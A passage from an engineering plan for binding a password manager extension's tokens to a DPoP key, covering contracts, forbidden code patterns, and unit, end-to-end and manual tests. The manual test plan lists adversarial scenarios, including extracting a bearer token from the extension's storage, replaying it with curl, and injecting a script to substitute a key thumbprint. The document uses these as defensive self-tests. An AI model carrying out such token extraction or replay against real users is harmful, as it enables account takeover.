  - Existing `ValidatedExtensionToken` type extended to expose `cnfJkt: string` (non-nullable — per Round 1 F3 + Round 3 F2-r3) so refresh + audit emit + C12 can read it without re-querying. Non-nullable because: BROWSER_EXTENSION rows now satisfy the partial CHECK constraint; IOS_APP rows whose cnf_jkt is null are rejected at the IOS dispatch guard (`mobile-token.ts:247-251`) BEFORE this type is constructed — so any `ValidatedExtensionToken` instance has a non-null cnfJkt by construction. The type now lives in `extension-token-types.ts`.
  - Scope set for cnfJkt-bound BROWSER_EXTENSION tokens unchanged from pre-this-PR (existing `EXTENSION_TOKEN_DEFAULT_SCOPES` retained, per Round 2 S18). cnfJkt binding is orthogonal to scope authorization.
- **Forbidden patterns**:
  - `pattern: row\.cnfJkt ===\s*proof\.jkt` outside `verifyDpopProof` — reason: timing-unsafe; the verifier's `expectedCnfJkt` is the only correct surface (uses `crypto.timingSafeEqual` internally per verify.ts:248).
  - `pattern: if \(token\.cnfJkt\)` in `validateExtensionToken` — reason: cnfJkt is NOT NULL on BROWSER_EXTENSION rows post-this-PR; the branch is dead.
  - `pattern: throw new Error\(.*DPoP` in `validateExtensionToken` or the new helper — reason: must return result-object errors, not throw.
- **Acceptance**:
  - BROWSER_EXTENSION row with valid DPoP → success.
  - BROWSER_EXTENSION row with no DPoP header → `EXTENSION_TOKEN_DPOP_INVALID`.
  - BROWSER_EXTENSION row with DPoP signed by wrong key → `EXTENSION_TOKEN_DPOP_INVALID`.
  - IOS_APP rows: existing test suite passes without modification (regression-safe).
  - `it.each(Object.values(DPOP_VERIFY_ERROR))` enumerates ALL failure codes returning `EXTENSION_TOKEN_DPOP_INVALID` with the right `dpopError` (per Round 2 T15 — `DPOP_VERIFY_ERROR` has 15 members at verify.ts:46-63; iteration source is `Object.values(...)` so future additions break the test, not silently pass).
- **Mock-update obligation**: After extracting the helper, Phase 2 implementer MUST run `grep -rln 'vi\.mock("@/lib/auth/tokens/extension-token"' src/__tests__/` and update EVERY hit (per Round 2 T26). Each hit either (a) spreads real exports via `vi.importActual` (preferred — drift-proof), or (b) explicitly mocks the new `validateExtensionTokenDpop` export. Round-1-audited file: `src/__tests__/lib/auth-or-token.test.ts:19-22`. Round-3 grep cmd documents the discovery surface; the literal file list is NOT fixed because new mock sites may exist when Phase 2 starts.

### C6 — Extension background: DPoP key lifecycle

- **Subject**: IDB-backed non-extractable EC P-256 key.
- **Signature**:
  ```ts
  // extension/src/lib/dpop-key.ts (NEW)
  export async function getOrGenerateDpopKeyPair(): Promise<{
    publicJwk: JsonWebKey;
    sign(data: ArrayBuffer): Promise<ArrayBuffer>;
  }>;
  export async function getDpopThumbprint(): Promise<string>;
  export async function signDpopProof(input: {
    route: string;        // e.g. "/api/extension/token/exchange"
    method: string;       // e.g. "POST"
    serverUrl: string;    // chrome.storage.local.get("serverUrl")
    accessToken?: string; // present for protected calls (Goal B), absent at exchange
  }): Promise<string>;    // JWS compact serialization, ready to set as `DPoP:` header
  ```
- **Invariants**:
  - Generated with `extractable: false`. Public key extracted as JWK for thumbprint computation.
  - Single CryptoKey instance shared across `getDpopThumbprint()` and `signDpopProof()`.
  - In-process Promise singleton prevents a generation race (tested explicitly per T12).
  - **Persist-before-resolve ordering** (per Round 2 S17): the IDB `put()` commit MUST complete BEFORE `getDpopThumbprint()` resolves to any caller. Implementation flow: `generateKey()` → `await idbPut()` → resolve in-process Promise. If SW is killed mid-keygen (between `generateKey()` and `idbPut()`), the next boot finds no IDB row and regenerates cleanly — no orphan thumbprint can ever be sent server-side that the SW cannot later sign with.
  - `htu` constructed via `canonicalHtuClient(serverUrl, route)` from `src/lib/auth/dpop/htu-canonical.ts` (shared with server, per Round 2 S13). Algorithm: `new URL(serverUrl).origin + route`.
  - `iat` = `Math.floor(Date.now() / 1000)`.
  - `jti` = `crypto.randomUUID()`.
  - Acceptance test fake: `fake-indexeddb` (added to extension devDeps per T1).
- **Forbidden patterns**:
  - `pattern: extractable: true` in `crypto.subtle.generateKey` for the ECDSA P-256 key — reason: private key MUST stay non-extractable.
  - `pattern: localStorage|chrome\.storage\.(local|session).*(dpop|cryptoKey|signingKey)` — reason: CryptoKey lives in IDB only.
  - `pattern: htu:\s*[`'"]\${serverUrl}` (template-literal concatenation without canonicalHtuClient) — reason: must use the shared canonicalizer.
- **Acceptance**:
  - Two sequential calls to `getOrGenerateDpopKeyPair()` return the same logical key (same thumbprint).
  - Cold IDB + `Promise.all([getOrGenerateDpopKeyPair(), getOrGenerateDpopKeyPair()])` → both return SAME thumbprint AND **`(await db.transaction('dpop-keys').objectStore('dpop-keys').getAll()).length === 1`** (observable-state assertion per Round 2 T25 — not a brittle vi.spyOn write counter).
  - SW "restart" (drop in-memory cache, re-open IDB) returns the same thumbprint.
  - **SW-kill-mid-keygen test** (per Round 2 S17): simulate SW kill between `generateKey()` and `put()` (mock IDB `put()` to throw once, then succeed) → next call regenerates cleanly with a NEW thumbprint AND IDB has exactly one row. Test name: `it("regenerates after SW kill mid-keygen — no IDB partial state", …)`.
  - `signDpopProof` output parses as a JWS, header has `typ: "dpop+jwt"`, `alg: "ES256"`, contains `jwk`; payload has `htm`, `htu`, `iat`, `jti`; with `accessToken` supplied also `ath` matching SHA-256.
  - `await crypto.subtle.exportKey("pkcs8", privateKey)` rejects (`await expect(...).rejects.toThrow()`).

### C7 — Extension content script: postMessage protocol

- **Subject**: jkt-handshake messages alongside the existing BRIDGE_CODE message.
- **Signature** (message shapes, conceptual):
  ```
  Incoming from web app (window.postMessage):
    PASSWD_SSO_EXT_JKT_REQUEST: { type, reqId: string }
    PASSWD_SSO_BRIDGE_CODE:     { type, code: string, expiresAt: number }  // existing

  Outgoing to web app (window.postMessage):
    PASSWD_SSO_EXT_JKT_READY:   { type, reqId: string, jkt: string }
  ```
- **Invariants**:
  - `reqId` is echoed back unmodified.
  - Origin/source checks identical to the existing BRIDGE_CODE handler.
  - Bridge-code handler additionally requests a DPoP proof from background and attaches it as `DPoP:` header.
  - `extension/src/__tests__/i18n/extension-constants-sync.test.ts` extended with `expect(extractStringConst(...))` for both new constants (per F9).
- **Forbidden patterns**:
  - `pattern: window\.postMessage\(.*type:.*EXT_JKT.*,\s*"\*"\)` — reason: must target `window.location.origin`.
  - `pattern: event\.data\.jkt` accessed without prior `type === "..._JKT_REQUEST"` discrimination — reason: structural validation precedes payload trust.

### C8 — Extension background: DPoP-aware fetch helpers

- **Subject**: attach DPoP proof on every authenticated call. Enumerate ALL bearer-using fetch sites (per F2).
- **Signature** (modification to `extension/src/background/index.ts`):
  ```ts
  // NEW shared helper:
  async function swFetchAuthenticated(
    path: string,
    init: RequestInit | undefined,
    serverUrl: string,
    token: string,
  ): Promise<Response> {
    const headers = new Headers(init?.headers);
    headers.set("Authorization", `Bearer ${token}`);
    // Sign DPoP proof with one retry on transient WebCrypto failure
    // (per Round 2 F6 — avoid self-induced sign-out from a single glitch).
    // Implementation note (per Round 3 F1-r3): keep proof typed `string`
    // by returning from each successful sign branch, or asserting after
    // the typed throw exits the outer try. The shape below uses an inner
    // helper so the type narrows correctly without `!` assertions.
    const sign = () => signDpopProof({
      route: path,
      method: (init?.method ?? "GET").toUpperCase(),
      serverUrl,
      accessToken: token,
    });
    let proof: string;
    try {
      proof = await sign();
    } catch {
      try {
        await resetInMemoryKeyCache();
        proof = await sign();
      } catch {
        // Second failure: throw a typed SW-internal error so callers can
        // distinguish "couldn't sign" from "server rejected." Callers MUST NOT
        // clearToken() on this branch — a transient WebCrypto glitch is not
        // a security event; the next call will succeed if the underlying
        // WebCrypto error was transient.
        throw new DpopSignError("DPoP_SIGN_FAILED");
      }
    }
    headers.set("DPoP", proof);
    return fetch(`${serverUrl}${path}`, { ...init, headers });
  }
  export class DpopSignError extends Error {
    constructor(public code: "DPoP_SIGN_FAILED") { super(code); }
  }

  // swFetch becomes a thin wrapper:
  async function swFetch(path: string, init?: RequestInit): Promise<Response> {
    if (!currentToken) throw new Error("NO_TOKEN");
    const { serverUrl } = await getSettings();
    // ... URL parse + permission gate unchanged ...
    return swFetchAuthenticated(path, init, serverUrl, currentToken);
  }

  // attemptTokenRefresh: replace direct fetch() with swFetchAuthenticated call.
  // revokeCurrentTokenOnServer: same.
  ```
- **Invariants**:
  - Every site that previously called `fetch(..., { headers: { Authorization: Bearer ${currentToken} } })` now calls `swFetchAuthenticated`.
  - Audited sites in `extension/src/background/index.ts` at Round-2 inspection: `swFetch` (L905-930), `attemptTokenRefresh` (L441-490), `revokeCurrentTokenOnServer` (L492-508). All three MUST route through the new helper.
  - **DPoP signing**: one retry on transient WebCrypto failure (drop in-memory cache, re-read from IDB, re-sign). Second failure throws `DpopSignError("DPoP_SIGN_FAILED")`. Callers MUST NOT `clearToken()` on this branch (per Round 2 F6 — avoids self-induced sign-out loop on transient glitches). The next user-triggered call retries from scratch.
  - **Testability** (per Round 2 T23): `attemptTokenRefresh` and `revokeCurrentTokenOnServer` are extracted to a new module `extension/src/background/token-handler.ts` (named exports). `extension/src/background/index.ts` imports them; the test imports them directly and exercises without alarm dispatch.
- **Forbidden patterns**:
  - `pattern: headers\.set\("DPoP",\s*currentToken\)` — reason: DPoP header is a JWS proof, not the access token.
  - `pattern: fetch\(.*Authorization.*Bearer.*\$\{currentToken\}` (anywhere in `extension/src/background/index.ts`) — reason: bypasses the DPoP helper. Round-2 grep MUST return zero hits in the modified file other than inside `swFetchAuthenticated` itself.

### C9 — Web app: AutoExtensionConnect handshake (strict)

- **Subject**: stage-1 jkt resolution before bridge-code issuance; no legacy fallback.
- **Signature** (modification to `auto-extension-connect.tsx::connect`):
  ```ts
  const connect = async () => {
    // Stage 1: ask the extension for its DPoP jkt.
    const jkt = await requestExtensionJkt({ timeoutMs: 500 });
    if (!jkt) {
      // Strict: no legacy fallback. Show "extension required" message.
      setStatus(CONNECT_STATUS.FAILED);
      setRequiresExtensionUpdate(true);
      return { ok: false, requiresExtensionUpdate: true };
    }
    // Stage 2: bridge-code issuance with cnfJkt.
    const res = await fetchApi(API_PATH.EXTENSION_BRIDGE_CODE, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cnfJkt: jkt }),
    });
    // ... existing flow continues ...
  };
  ```
- **Invariants**:
  - On stage-1 null → connect fails with the new "extension required" state (FR8 / FR-A11n).
  - Only the first `PASSWD_SSO_EXT_JKT_READY` matching the issued `reqId` is honored.
  - The 500 ms timeout is short enough not to delay sign-in noticeably; cold-path key generation in the SW is well under that bound in measured runs.

  *Consumer walkthrough*: bridge-code RESPONSE `{ code, expiresAt }` is consumed by `injectExtensionBridgeCode(code, expiresAt)` which posts `PASSWD_SSO_BRIDGE_CODE`. The content script's `handleBridgeCodeMessage` ALSO requests a DPoP proof from background before the exchange fetch. The content script reads `code` (for body) and `expiresAt` (for validity window). No new field on the bridge-code response.
- **Forbidden patterns**:
  - `pattern: requireRecentCurrentAuthMethod.*remove|removed` — reason: per S5 the step-up gate MUST remain.

### C9a — `requestExtensionJkt` helper

- **Subject**: web-app helper that resolves the extension's DPoP thumbprint via postMessage.
- **Signature**:
  ```ts
  // NEW file: src/lib/extension-jkt-request.ts
  export async function requestExtensionJkt(opts: { timeoutMs: number }): Promise<string | null>;
  ```
- **Invariants**:
  - Generates a UUID `reqId` via `crypto.randomUUID()`.
  - Posts `{ type: EXT_JKT_REQUEST_MSG_TYPE, reqId }` to `window` with target origin `window.location.origin` (NOT `"*"`).
  - Registers a temporary listener filtered on `event.source === window && event.origin === window.location.origin && event.data?.type === EXT_JKT_READY_MSG_TYPE && event.data?.reqId === reqId && typeof event.data?.jkt === "string" && /^[A-Za-z0-9_-]{43}$/.test(event.data.jkt)`.
  - Honors ONLY the first matching response; subsequent matching responses are ignored.
  - On `timeoutMs` timeout, removes listener and resolves `null`.
  - On resolution (success OR timeout), the listener is removed in `finally`.
- **Forbidden patterns**:
  - `pattern: window\.postMessage\(.*EXT_JKT_REQUEST.*,\s*"\*"\)` — reason: must target same origin.
  - `pattern: window\.addEventListener\("message",.*EXT_JKT_READY` without an `event.source === window` filter — reason: would honor any READY message including XSS-injected ones.
  - `pattern: removeEventListener` missing from the helper's `finally` block — reason: listener leak.
- **Acceptance**:
  - Returns the jkt within timeoutMs when a matching READY arrives.
  - Returns null after timeoutMs when no READY arrives.
  - Ignores READY messages with wrong reqId, wrong origin, wrong source, or malformed jkt.
  - Listener is removed on both success and timeout (no leak).

### C10 — Refresh route preserves `cnfJkt`

- **Subject**: rotated token row carries cnfJkt forward.
- **Signature** (modification to `src/app/api/extension/token/refresh/route.ts`):
  ```ts
  // After validateExtensionToken returns ok (which now requires DPoP per FR4):
  const newToken = await tx.extensionToken.create({
    data: {
      userId: validated.userId,
      tenantId: validated.tenantId,
      tokenHash: newTokenHash,
      scope: scopeCsv,
      expiresAt,
      familyId,                  // carry forward
      familyCreatedAt,           // carry forward
      cnfJkt: validated.cnfJkt,  // NEW — carry forward
    },
    select: { id: true, expiresAt: true, cnfJkt: true },
  });
  ```
- **Invariants**:
  - Refresh validates the old token via `validateExtensionToken` which now requires DPoP for BROWSER_EXTENSION (per FR4) — so the refresh request itself MUST carry a DPoP header bound to its route.
  - The new row's `cnfJkt` equals the old row's `cnfJkt`.
  - Response shape includes `cnfJkt` per C3b.
  - The refactor is the smallest possible — refresh continues to inline `tx.extensionToken.create` rather than calling `issueExtensionToken` because refresh must preserve `familyId` / `familyCreatedAt` atomically with revoke (different transaction shape).
- **Forbidden patterns**:
  - `pattern: tx\.extensionToken\.create\(\{\s*data:\s*\{[^}]*familyId[^}]*\}\s*\}\)` in `refresh/route.ts` without `cnfJkt` in the data block — reason: rotation MUST preserve binding. Phase-3 grep checks this.
- **Acceptance**:
  - Integration test: issue cnfJkt-bound token → refresh with DPoP → new row's cnfJkt equals old's.
  - Refresh without DPoP → 401 (because the inner `validateExtensionToken` rejects).

### C11 — CORS Allow-Headers includes `DPoP`

- **Subject**: preflight responses advertise the `DPoP` header so chrome-extension origin fetches are not blocked.
- **Signature** (modification to `src/lib/http/cors.ts`):
  ```ts
  // Modify corsHeaders():
  "Access-Control-Allow-Headers": "Content-Type, Authorization, DPoP",
  ```
- **Invariants**:
  - The header list is shared between same-origin and chrome-extension flows; no per-origin conditional.
  - Applies to every route that classifies as CORS-eligible (existing `allowExtension: true` routes).
- **Forbidden patterns**:
  - `pattern: "Access-Control-Allow-Headers":\s*"Content-Type,\s*Authorization"\b(?!,\s*DPoP)` — reason: must include `DPoP`.
- **Acceptance**:
  - cors-gate.test.ts: preflight OPTIONS to `/api/extension/token/exchange` with `Origin: chrome-extension://...` and `Access-Control-Request-Headers: dpop` returns 204 with `Access-Control-Allow-Headers` containing `DPoP` (case-insensitive substring match).
  - Manual: open the loaded extension in Chrome and verify no preflight failures appear in DevTools console for the exchange call.

### C12 — `POST /api/extension/key/reset` endpoint

- **Subject**: server-side revoke endpoint called by the extension before discarding its IDB key (per FR12 / Round 2 F3 / S11).
- **Signature**:
  ```ts
  // Route: src/app/api/extension/key/reset/route.ts
  const KeyResetRequestSchema = z
    .object({ cnfJkt: z.string().regex(/^[A-Za-z0-9_-]{43}$/) })
    .strict();

  async function handlePOST(req: NextRequest) {
    // Authn: Bearer + DPoP (no session cookie).
    const validated = await validateExtensionToken(req);
    if (!validated.ok) return unauthorized();

    // Rate limit (per-user, 5 calls per 15 min — reset is rare).
    // ... existing createRateLimiter pattern ...

    // Body parse.
    const body = await parseBody(req, KeyResetRequestSchema);
    if (!body.ok) return body.response;

    // **Critical invariant** (per Round 2 S11): body-supplied cnfJkt MUST
    // equal the validated token's cnfJkt (= the DPoP-verified jkt). This
    // proves the caller currently possesses the key it is asking to revoke
    // — otherwise an attacker who stole a valid Bearer could call this
    // endpoint to revoke the legitimate user's OTHER cnfJkt-bound tokens.
    if (!safeStringEqual(body.data.cnfJkt, validated.data.cnfJkt)) {
      return errorResponse(API_ERROR.INVALID_REQUEST);
    }

    // Revoke ONLY tokens belonging to the calling userId with matching cnfJkt.
    const result = await withBypassRls(prisma, async (tx) =>
      tx.extensionToken.updateMany({
        where: {
          userId: validated.data.userId,
          cnfJkt: body.data.cnfJkt,
          revokedAt: null,
        },
        data: { revokedAt: new Date() },
      }),
    BYPASS_PURPOSE.TOKEN_LIFECYCLE);

    await logAuditAsync({
      ...personalAuditBase(req, validated.data.userId),
      tenantId: validated.data.tenantId,
      action: AUDIT_ACTION.EXTENSION_TOKEN_FAMILY_REVOKED,
      targetType: AUDIT_TARGET_TYPE.EXTENSION_TOKEN,
      metadata: {
        reason: "user_key_reset",
        cnfJktFingerprint: sha256Hex(body.data.cnfJkt).slice(0, 16),
        rowsRevoked: result.count,
      },
    });

    return NextResponse.json({ revoked: result.count }, { status: 200 });
  }
  ```
- **Invariants**:
  - AuthN: validateExtensionToken (Bearer + DPoP per FR4). Endpoint is in `EXTENSION_TOKEN_ROUTES` bypass list (per cors-gate.ts change above).
  - AuthZ: revokes ONLY tokens of the calling `userId` with matching `cnfJkt`. Other users' tokens with the same jkt (statistically impossible collision) are NEVER touched.
  - **Body-cnfJkt-must-match-proof**: `body.cnfJkt === validated.data.cnfJkt` enforced via `safeStringEqual`. Failure → 400 (timing-uniform with other invalid-request paths). Closes the stolen-Bearer-revoke-DoS vector.
  - **Idempotency**: calling twice returns `{ revoked: 0 }` on the second call (rows already revoked). Not an error.
  - **Atomicity contract with client**: server completes revoke + returns 2xx BEFORE the extension deletes its IDB key. On non-2xx response, the extension keeps the IDB row and surfaces a UI error (per FR12).
  - Rate limit: per-user, 5 calls per 15 min (createRateLimiter pattern).
  - Audit: `EXTENSION_TOKEN_FAMILY_REVOKED` with `metadata.reason: "user_key_reset"` + `metadata.cnfJktFingerprint` (first 16 hex of SHA-256(cnfJkt)).
  - No `family_id` or session-level cascade — reset only affects the user's own bound tokens (intentional: user may have legitimately-issued tokens with OTHER cnfJkt that should remain unaffected).
- **Forbidden patterns**:
  - `pattern: where:\s*\{\s*cnfJkt:\s*body\.data\.cnfJkt` WITHOUT a preceding `body.data.cnfJkt === validated.data.cnfJkt` check (any spelling — including via `safeStringEqual`) — reason: trusting body cnfJkt without proof-of-possession enables stolen-Bearer revoke DoS.
  - `pattern: tx\.extensionToken\.updateMany\(\{[^}]*where:\s*\{\s*cnfJkt:` without `userId:` in the same `where` block — reason: cross-user revoke is a privacy/availability vulnerability.
- **Acceptance**:
  - Test: valid Bearer + DPoP + matching body cnfJkt → 200, target rows revoked.
  - Test: missing Bearer → 401 (proxy session gate, but endpoint is in EXTENSION_TOKEN_ROUTES bypass — actually 401 from validateExtensionToken itself).
  - Test: valid Bearer + missing DPoP → 401.
  - Test: body cnfJkt ≠ validated cnfJkt → 400 (per the critical invariant).
  - Test: idempotent — call twice with same valid input → second call returns `{revoked: 0}`.
  - Test: rate-limit fires after 5 calls in 15 min per user.
  - Test: negative control — user A has tokens with cnfJkt=X and cnfJkt=Y. Call /key/reset with body cnfJkt=X. Verify cnfJkt=Y tokens NOT revoked.
  - Test: cross-user safety — user A's call must not touch user B's tokens with the same cnfJkt (mock or seed both users with the same jkt → call as A → assert B's tokens still active).

---

## Go/No-Go Gate

| ID   | Subject                                                                | Status  |
|------|------------------------------------------------------------------------|---------|
| C1   | `ExtensionBridgeCode.cnfJkt` NOT NULL column                           | locked  |
| C2   | `POST /api/extension/bridge-code` body schema (cnfJkt required, step-up preserved) | locked  |
| C3   | `POST /api/extension/token/exchange` DPoP enforcement (always required) | locked  |
| C3b  | Exchange + refresh response carries `cnfJkt`                            | locked  |
| C4   | `issueExtensionToken` requires `cnfJkt`                                 | locked  |
| C5   | `validateExtensionTokenDpop` shared helper + `validateExtensionToken` dispatch (no legacy branch) | locked  |
| C6   | Extension background DPoP key lifecycle (IDB, non-extractable, fake-indexeddb test) | locked  |
| C7   | Extension content script postMessage protocol                          | locked  |
| C8   | Extension background DPoP-aware fetch helpers (all 3 sites)            | locked  |
| C9   | Web app `AutoExtensionConnect` strict handshake                        | locked  |
| C9a  | `requestExtensionJkt` web-app helper                                   | locked  |
| C10  | Refresh route preserves `cnfJkt`                                       | locked  |
| C11  | CORS Allow-Headers includes `DPoP`                                     | locked  |
| C12  | `POST /api/extension/key/reset` endpoint (body-cnfJkt-must-match-proof) | locked  |

All contracts are LOCKED. Plan transitions to Phase 2.

---

## Testing strategy

### Unit (vitest, server)

- `src/__tests__/api/extension/bridge-code-cnfJkt.test.ts` — covers C2: valid cnfJkt → 201, missing cnfJkt → 400, invalid cnfJkt → 400, `{cnfJkt: valid, unknown: "x"} → 400` (proves `.strict()` per T11), step-up gate still fires (per S5).
- `src/__tests__/api/extension/token-exchange-dpop.test.ts` — covers C3: valid DPoP → 201, missing DPoP → 401, wrong-key DPoP → 401. **Symmetric vacuous-pass guard (per T4)**:
  - Success path: `expect(mockVerifyDpop).toHaveBeenCalledTimes(1)` AND `toHaveBeenCalledWith(expect.anything(), expect.objectContaining({ expectedCnfJkt: <expected>, expectedHtm: "POST", expectedAth: undefined }))`.
  - Failure path: `expect(mockVerifyDpop).toHaveBeenCalledTimes(1)` AND response is 401.
- `src/lib/auth/dpop/validate-token-dpop.test.ts` — covers C5 (co-located per Round 2 T22 — matches existing verify.test.ts / htu-canonical.test.ts / jti-cache.test.ts neighbors): `it.each(Object.values(DPOP_VERIFY_ERROR))` enumerates ALL 15 failure codes (per Round 2 T15 — iterates over the const-object, not a hand-rolled literal list). Tests assert `lastUsedIp/UA` updated for IOS_APP, NOT updated for BROWSER_EXTENSION.
- `src/__tests__/api/extension/token-refresh-cnfJkt.test.ts` — covers C10: refresh of a cnfJkt-bound row → new row's cnfJkt equals old's. Refresh without DPoP → 401.
- `src/__tests__/api/extension/key-reset.test.ts` — covers C12 (per Round 2 T16): valid Bearer + DPoP + matching body cnfJkt → 200; missing Bearer → 401; missing DPoP → 401; body cnfJkt ≠ validated cnfJkt → 400 (the critical invariant); idempotency (2nd call returns `{revoked: 0}`); rate-limit fires; negative control (cnfJkt=Y NOT revoked when call targets cnfJkt=X); cross-user safety.
- `src/__tests__/lib/http/cors-dpop-header.test.ts` — covers C11: preflight returns `DPoP` in Allow-Headers.
- `src/lib/auth/dpop/htu-canonical.test.ts` — extend with: `it.each([{serverUrl, route, appOrigin}, ...])` equivalence smoke test (per Round 2 S13 + Round 3 S23-r3) — assert `canonicalHtuClient(serverUrl, route) === canonicalHtu({route})` when `getAppOrigin()` is mocked to `appOrigin` for: case variants, default-port present/absent, trailing slash on serverUrl, **AND basePath-bearing serverUrl** (e.g. `serverUrl="https://example.com/passwd-sso", route="/api/x", appOrigin="https://example.com/passwd-sso"` → both produce `https://example.com/passwd-sso/api/x`).
- Mock module: `@/lib/auth/dpop/verify` — verifier behavior covered by its own existing test suite (jti-cache.test.ts etc.); new unit tests stub the success/failure result.
- DPoP error code references use `DPOP_VERIFY_ERROR.*` symbols (per `feedback_const_object_for_string_literals.md`), not string literals.
- **Strict-mode test refinement** (per Round 2 T24): C2 acceptance "`{cnfJkt: valid, unknown: 'x'} → 400`" — additionally assert the 400 response body carries the Zod issue with `code: "unrecognized_keys"` to prove the rejection mechanism is `.strict()` itself, not an unrelated 400.

### Unit (vitest, extension)

- `extension/package.json` adds `fake-indexeddb` to devDependencies (per T1).
- `extension/vitest.config.ts` adds: `environmentMatchGlobs: [["**/dpop-key.test.ts", "jsdom"]]` AND the test file imports `"fake-indexeddb/auto"` at top.
- `extension/src/__tests__/dpop-key.test.ts` — covers C6: generation, IDB persistence across simulated SW restart (drop in-memory cache + re-open), `Promise.all` race returns same thumbprint with `expect(idbWriteCount).toBe(1)` cardinality (per T12), `crypto.subtle.exportKey("pkcs8", privateKey)` rejects.
- `extension/src/__tests__/background/swFetch-dpop.test.ts` — covers C8: DPoP header attached on `swFetch`, `attemptTokenRefresh`, `revokeCurrentTokenOnServer` (all three sites tested individually).
- `extension/src/__tests__/token-bridge.test.ts` (lib variant exists) — extend to cover C7: JKT_REQUEST → JKT_READY roundtrip, reqId echo, origin rejection.

### Integration (vitest + real Postgres)

- `src/__tests__/db-integration/extension-token-dpop-flow.integration.test.ts` — end-to-end against real DB and **real DPoP verifier** (sentinel comment + unmocked import per T3): bridge-code issuance with cnfJkt → exchange with DPoP signed by generated EC key → API call with DPoP → refresh with DPoP → assert new row's cnfJkt preserved.
  ```ts
  // I-T3-1: real verifier sentinel — do NOT vi.mock("@/lib/auth/dpop/verify").
  // The test must exercise verifyDpopProof end-to-end so a regression in
  // jkt-derivation or htu-canonicalization fails the test, not silently passes.
  ```
- Test uses `jwkThumbprint()` (exported from `verify.ts`) to compute the thumbprint from a generated EC P-256 key; passes the same key for signing — proves the binding round-trips.
- Test location chosen `db-integration/` (not `integration/`) because the test asserts cnfJkt is persisted to a real Postgres row; existing `mobile-dpop-flow.integration.test.ts` uses mocked Prisma + real verifier (different focus).
- **New migration integration test** (per Round 2 T17): `src/__tests__/db-integration/migration-extension-cnfjkt.integration.test.ts` — seeds the DB with `INSERT INTO extension_tokens (client_kind, cnf_jkt, …) VALUES ('BROWSER_EXTENSION', NULL, …), ('BROWSER_EXTENSION', '<valid-jkt>', …), ('IOS_APP', NULL, …)`, runs the migration, asserts: (a) the legacy BROWSER_EXTENSION row is deleted, (b) the cnfJkt-bound BROWSER_EXTENSION row survives, (c) the IOS_APP NULL row survives (still out of scope for this migration but rejected at validate time).
- **Existing test rewrite** (per Round 2 S12): `src/__tests__/db-integration/extension-token-migration.integration.test.ts:112-131` currently asserts `validateExtensionToken accepts a BROWSER_EXTENSION row without a DPoP proof`. This invariant is REVERSED by this PR — the test MUST be rewritten in the same PR to assert `validateExtensionToken` returns `EXTENSION_TOKEN_DPOP_INVALID` for the same fixture. Phase-2 grep checklist: `grep -rn "accepts a BROWSER_EXTENSION row without a DPoP" src/__tests__/` must return zero hits post-rewrite.
- Pre-PR: verify `npm run test:integration` includes the new file in discovery output (per T9).

### E2E (Playwright)

- **Playwright extension loader setup (new)** — per T7:
  - `e2e/playwright.config.ts` adds a new project `extension` that uses `chromium.launchPersistentContext(userDataDir, { args: ["--disable-extensions-except=<built-extension-path>", "--load-extension=<built-extension-path>"] })`.
  - `e2e/global-setup.ts` runs `npm --prefix extension run build` BEFORE any test starts. The spawn is wrapped in `try/catch` that prints `"Extension build failed — fix extension/ before running E2E"` with the build stdout/stderr; opaque failure mode is avoided (per Round 2 T21). Alternative: run the build as a separate CI step so failure surface is unambiguous.
  - **Per-test isolation** (per Round 2 T18): each test gets a fresh `userDataDir` via `test.beforeEach(async ({ }, testInfo) => { userDataDir = path.join(os.tmpdir(), `psso-e2e-${testInfo.testId}`); … })`. Tests do not share extension IDB / session / cookie state. `workers: 1` retained for the extension project (Chrome doesn't support multiple persistent contexts cleanly).
- `e2e/extension-token-dpop.spec.ts` — full sign-in → AutoExtensionConnect → extension receives DPoP-bound token → simulated swFetch carries DPoP. **Network-observability assertion** using context-level capture (per Round 2 T19 — `page.on("request")` does NOT capture extension SW fetches; they originate from the SW target):
  ```ts
  const requests: Request[] = [];
  // context-level listener captures requests from page AND service worker.
  context.on("request", (req) => {
    if (new URL(req.url()).pathname === "/api/passwords") requests.push(req);
  });
  // ... trigger UI action that fires the API call ...
  const dpop = requests[0]?.headers()["dpop"];
  expect(dpop).toBeTruthy();
  expect(dpop.split(".")).toHaveLength(3);  // JWS compact serialization
  ```
  If context-level capture is insufficient for SW fetches on the target Playwright version, fall back to: `const sw = await context.waitForEvent("serviceworker"); sw.on("request", …)` — verify which API the project's Playwright version actually exposes during Phase 2 implementation.
- DOM assertions (if any new "extension required" message is asserted): `getByText` with exact strings verified to exist in `messages/en/Extension.json` / `messages/ja/Extension.json`. No `getByRole(name: regex)`.

### Manual test plan

- `docs/archive/review/extension-dpop-sender-constrained-manual-test.md` (created during Phase 2; R35 Tier-2 trigger fires — auth-flow change + cryptographic-material handling).
- Sections: Pre-conditions, Steps, Expected, Rollback, plus **Adversarial scenarios** (per T13 expansion):
  - Page-context jkt substitution (XSS-equivalent): manually inject a JS snippet on the connect page that responds to `EXT_JKT_REQUEST` with a self-generated jkt → verify the resulting token is bound to the attacker key and cannot be replayed cross-context.
  - Exfiltrated bearer replay from curl: extract the bearer from the connected extension's IDB → attempt `curl -H "Authorization: Bearer <token>" .../api/passwords` (NO DPoP) → must 401.
  - Cross-tenant: user A connects, switches tenant via UI → verify the cnfJkt-bound token does NOT carry over (or does, depending on per-token-row vs per-tenant-context semantics — verify the actual behavior).
  - Token replay across browsers: capture bearer + token in browser X; in browser Y attempt to authenticate as the same user with the stolen bearer ONLY → must fail (key absent in Y).
  - Mid-session key rotation via "Reset connection": after reset, OLD bearer must immediately stop working at the server (proof carries new jkt, mismatch → 401). Validates FR12 server-side revoke.
  - DPoP-Nonce absence does not regress iat-skew clock attack: time-shift the extension by `>30s + 1s` → exchange must fail with `IAT_OUT_OF_WINDOW`.

### Extension boot test (R32) — tightened acceptance (per T10 + Round 2 T20)

Run after `chrome://extensions` → load unpacked. Required observations:
1. First connect after fresh install:
   - Chrome DevTools Application tab → IndexedDB → `psso-ext` DB → `dpop-keys` store → `current` row exists.
   - DevTools Console (specific IDB inspection, not generic origin-storage estimate per Round 2 T20):
     ```js
     const db = await new Promise((res, rej) => {
       const r = indexedDB.open("psso-ext");
       r.onsuccess = () => res(r.result); r.onerror = () => rej(r.error);
     });
     const tx = db.transaction("dpop-keys", "readonly");
     const rec = await new Promise((res) => {
       const r = tx.objectStore("dpop-keys").get("current");
       r.onsuccess = () => res(r.result);
     });
     console.log(rec.privateKey instanceof CryptoKey, rec.privateKey.extractable);
     // Expected: true, false
     ```
   - DevTools Console: `await crypto.subtle.exportKey("pkcs8", rec.privateKey)` throws (non-extractable verified at runtime).
